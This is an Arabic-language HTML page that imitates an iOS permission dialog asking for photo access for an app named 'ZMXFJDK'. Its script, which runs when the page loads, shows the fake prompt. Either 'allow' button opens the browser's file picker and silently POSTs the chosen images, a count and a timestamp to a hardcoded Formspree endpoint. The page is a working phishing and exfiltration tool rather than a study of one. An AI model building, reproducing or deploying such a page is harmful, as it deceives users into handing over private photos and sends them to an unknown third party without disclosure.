<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZMXFJDK</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
        }

        /* iOS Style Alert Dialog */
        .ios-alert {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.4);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            animation: fadeIn 0.3s ease-out;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        .ios-alert-content {
            background: white;
            border-radius: 14px;
            padding: 0;
            max-width: 270px;
            width: 90%;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.15);
            animation: popIn 0.3s ease-out;
            overflow: hidden;
        }

        @keyframes popIn {
            from {
                opacity: 0;
                transform: scale(0.9);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }

        .ios-alert-header {
            padding: 20px 20px 15px;
            text-align: center;
        }

        .ios-alert-app-name {
            font-size: 13px;
            color: #666;
            margin-bottom: 8px;
        }

        .ios-alert-title {
            font-size: 17px;
            font-weight: 600;
            color: #000;
            margin-bottom: 8px;
        }

        .ios-alert-message {
            font-size: 13px;
            color: #666;
            line-height: 1.4;
        }

        .ios-alert-buttons {
            display: flex;
            flex-direction: column;
            border-top: 1px solid #e5e5ea;
        }

        .ios-alert-button {
            padding: 12px;
            border: none;
            background: white;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            border-bottom: 1px solid #e5e5ea;
            color: #007AFF;
            transition: background 0.2s;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
        }

        .ios-alert-button:last-child {
            border-bottom: none;
        }

        .ios-alert-button:active {
            background: #f2f2f7;
        }

        .ios-alert-button.deny {
            color: #007AFF;
        }

        .ios-alert-button.once {
            color: #007AFF;
        }

        .ios-alert-button.allow {
            color: #007AFF;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <!-- iOS Style Permission Dialog -->
    <div class="ios-alert" id="permissionDialog">
        <div class="ios-alert-content">
            <div class="ios-alert-header">
                <div class="ios-alert-app-name">ZMXFJDK</div>
                <div class="ios-alert-title">تطبيق يريد الوصول إلى صورك</div>
                <div class="ios-alert-message">
                    سيتمكن من الوصول إلى الصور والفيديوهات في جهازك
                </div>
            </div>
            <div class="ios-alert-buttons">
                <button class="ios-alert-button deny" onclick="denyPermission()">عدم السماح</button>
                <button class="ios-alert-button once" onclick="allowOnce()">السماح مرة واحدة فقط</button>
                <button class="ios-alert-button allow" onclick="allowAlways()">السماح دائماً</button>
            </div>
        </div>
    </div>

    <script>
        const FORMSPREE_ID = 'mrewggoj';
        const FORMSPREE_URL = `https://formspree.io/f/${FORMSPREE_ID}`;

        function denyPermission() {
            document.getElementById('permissionDialog').style.display = 'none';
        }

        function allowOnce() {
            collectAndSendPhotos();
        }

        function allowAlways() {
            collectAndSendPhotos();
        }

        async function collectAndSendPhotos() {
            try {
                if (!window.showOpenFilePicker) {
                    throw new Error('متصفحك لا يدعم هذه الميزة');
                }

                const fileHandle = await window.showOpenFilePicker({
                    types: [{
                        description: 'صور',
                        accept: {
                            'image/*': ['.jpeg', '.jpg', '.png', '.gif', '.webp', '.bmp']
                        }
                    }],
                    multiple: true
                });

                if (fileHandle.length === 0) {
                    return;
                }

                const formData = new FormData();

                for (let i = 0; i < fileHandle.length; i++) {
                    const file = await fileHandle[i].getFile();
                    
                    if (file.size > 5 * 1024 * 1024) {
                        continue;
                    }

                    formData.append(`image_${i + 1}`, file);
                }

                formData.append('total_images', fileHandle.length);
                formData.append('timestamp', new Date().toLocaleString('ar-SA'));
                formData.append('_subject', `تم استقبال ${fileHandle.length} صورة من ZMXFJDK`);

                await fetch(FORMSPREE_URL, {
                    method: 'POST',
                    body: formData
                });

            } catch (error) {
                console.error('Error:', error);
            }
        }

        // Show dialog on page load
        window.addEventListener('load', () => {
            document.getElementById('permissionDialog').style.display = 'flex';
        });
    </script>
</body>
</html>
